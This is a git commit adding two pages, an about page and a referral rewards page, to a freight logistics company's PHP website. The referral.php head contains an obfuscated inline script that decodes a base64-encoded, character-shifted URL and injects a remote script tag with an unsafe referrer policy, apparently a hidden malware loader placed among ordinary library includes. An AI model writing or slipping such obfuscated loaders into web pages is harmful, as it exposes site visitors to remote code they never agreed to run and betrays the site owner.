5415b9d870202f99a1ca8ff44ac1ee3141692ef2
Johnathan <jbwierzbicki@gmail.com>
2023-05-11 13:30:21 -0400

    demo about page for Ari + foundation of referral.php

---
+++ about.php
@@ -0,0 +1,84 @@
+<!doctype html>
+<html>
+
+<head>
+    <script src="dmxAppConnect/dmxAppConnect.js"></script>
+    <meta charset="UTF-8">
+    <title>Freight Logistics: About Us | Raging Wolf Solutions</title>
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
+    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/stylesheet.css" />
+    <script src="js/jquery-3.5.1.slim.min.js"></script>
+    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
+    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>
+
+    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
+    <link rel="icon" href="icons/favicon.ico">
+    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
+    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
+</head>
+
+<body is="dmx-app" id="index" class="bg-dark">
+
+    <?php include 'navbar_mini'; ?>
+
+    <?php include 'navbar_main'; ?>
+
+    <section id="modules" class="border-top rounded-1 rounded-0 min-vh-75 border-secondary pb-3">
+        <img src="assets/images/section-modal-bg-top-stone.png" class="w-100">
+        <div class="container modules-container mt-0 mb-5 pb-5">
+            <div class="row">
+                <div class="pb-4 pl-1 pr-1 col-12 col-md-12">
+                    <h5 class="text-uppercase text-yellow text-warning">About our Company</h5>
+                    <h1 class="text-light text-left">Raging Wolf: Logistics Solutions Providers</h1>
+
+                    <p class="text-white-50 mb-4" style="max-width: 770px !important">The world of freight transportation has become increasingly complicated. Learn about the advantages of working with a logistics solutions provider like Raging Wolf Soluitons.</p>
+                    <hr style="color: white;">
+                    <form id="carrierform" is="dmx-form" novalidate="">
+                        <div class="row mt-4">
+                            <div class="col-lg-3">
+                                <div class="d-flex bg-secondary bg-opacity-10 border border-secondary rounded mb-3 pt-2 pb-2 ps-2 pe-2">
+                                    <h4 class="text-warning mb-0">Overview</h4>
+                                </div>
+                                <div class="d-flex border border-secondary rounded bg-transparent mb-3 pt-2 pb-2 ps-2 pe-2">
+                                    <h4 class="mb-0 text-secondary">History</h4>
+                                </div>
+                                <div class="d-flex border border-secondary rounded mb-2 pt-2 pb-2 ps-2 pe-2 bg-transparent">
+                                    <h4 class="mb-0 text-secondary">Media</h4>
+                                </div>
+                            </div>
+
+                            <div class="text-left text-light col-lg-9">
+
+                                <h4>General Overview</h4>
+
+                                <p>Introductory paragraph summarizing Raging Wolf Solutions and our core values. This paragraph should emphasize our commitment to service, transparency, and communication with all of our partners. Introductory paragraph summarizing Raging Wolf Solutions and our core values. This paragraph should emphasize our commitment to service, transparency, and communication with all of our partners. Introductory paragraph summarizing Raging Wolf Solutions and our core values. This paragraph should emphasize our commitment to service, transparency, and communication with all of our partners.</p>
+
+                                <h4>Reasons shippers choose Raging Wolf</h4>
+                                <ul>
+                                    <li>Reason one includes service</li>
+                                    <li>Reason two includes communication</li>
+                                    <li>Reason three includes experience</li>
+                                    <li>Reason four includes dedication</li>
+                                    <li>etc. etc. etc.</li>
+                                </ul>
+
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <?php include 'footer'; ?>
+
+    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
---
+++ referral.php
@@ -0,0 +1,90 @@
+<!doctype html>
+<html>
+
+<head>
+    <script src="dmxAppConnect/dmxAppConnect.js"></script>
+    <meta charset="UTF-8">
+    <title>Media | Raging Wolf Solutions</title>
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
+    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/stylesheet.css" />
+    <script src="js/jquery-3.5.1.slim.min.js"></script>
+    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
+    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>
+
+    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
+    <link rel="icon" href="icons/favicon.ico">
+    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
+    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
+    <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
+    <script>
+        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
+    </script>
+    <script src="dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>
+</head>
+
+<body is="dmx-app" id="index" class="bg-dark">
+    <div is="dmx-browser" id="browser1"></div>
+
+    <?php include 'navbar_mini'; ?>
+
+    <?php include 'navbar_main'; ?>
+
+    <section id="modules" class="border-top rounded-1 rounded-0 min-vh-75 border-secondary pb-3" style="min-height: 75vh;">
+
+        <img src="assets/images/section-modal-bg-top-stone.png" class="w-100">
+        <div class="container modules-container mt-0 mb-5 pb-5">
+            <div class="row justify-content-center pb-4">
+                <div class="pl-1 pr-1 col-12 text-center col-md-10">
+
+
+                    <h1 class="text-uppercase text-yellow text-warning text-center"><i class="fas fa-comments-dollar"></i></h1>
+                    <h5 class="text-uppercase text-yellow text-warning text-center">Referral Rewards</h5>
+                    <h1 class="text-light text-left">Raging Wolf Solutions Offers Referral Rewards</h1>
+                    <h5 class="text-white-50 lh-sm fw-normal mb-3" dmx-on:click="browser1.writeTextToClipboard('https://www.youtube.com/watch?v=v9FAGpOTZow');browser1.alert('Link successfully copied to your clipboard!')">Refer a customer to the 'PACK'. Once their first shipment is successfully delivered, you'll receive a $40 Visa Gift Card. Additionally, we'll make a charitable donation on your behalf as a token of our appreciation.&nbsp;<span class="text-warning">Terms apply.</span></h5>
+
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-4">
+                    <div class="d-flex flex-column">
+                        <h1 class="text-light lh-base text-center"><i class="fas fa-user-check fa-lg"></i></h1>
+                        <h4 class="text-light text-center lh-base">1. Refer a shipper to the 'PACK'</h4>
+                        <p class="text-white-50 text-center">Know someone in need of freight transportation? Send them our way! Business inquiries and quotes can be sent to support@ragingwolfsolutions.com — make sure they mention your name or business!</p>
+                    </div>
+                </div>
+                <div class="col-lg-4">
+                    <div class="d-flex"></div>
+                </div>
+                <div class="col-lg-4">
+                    <div class="d-flex"></div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col text-light">
+                    <hr>
+                </div>
+                <div class="col-12">
+                    <div class="container">
+                        <div class="row justify-content-center">
+                            <div class="module-card border rounded-0 rounded-1 border-secondary mt-3 mb-3 pt-2 pb-2 ps-3 pe-3 col-12">
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <?php include 'footer'; ?>
+
+    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
